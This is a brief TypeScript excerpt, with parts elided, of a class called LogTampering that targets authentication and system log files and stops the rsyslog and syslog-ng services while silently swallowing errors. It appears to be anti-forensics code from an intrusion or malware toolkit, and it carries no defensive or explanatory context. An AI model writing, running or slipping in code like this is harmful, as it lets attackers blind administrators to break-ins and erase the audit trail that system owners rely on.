...
class LogTampering {
  static readonly CRITICAL_LOGS: readonly string[] = [
    "/var/log/auth.log",
    "/var/log/secure",
    "/var/log/syslog",
    "/var/log/messages",
  ...
  static disableLogging(): void {
    ...
    for (const svc of ["rsyslog", "syslog-ng"]) {
      try { execSync(`systemctl stop ${svc}`, { stdio: "ignore" }); } catch { /* swallow */ }
    }
  }
}
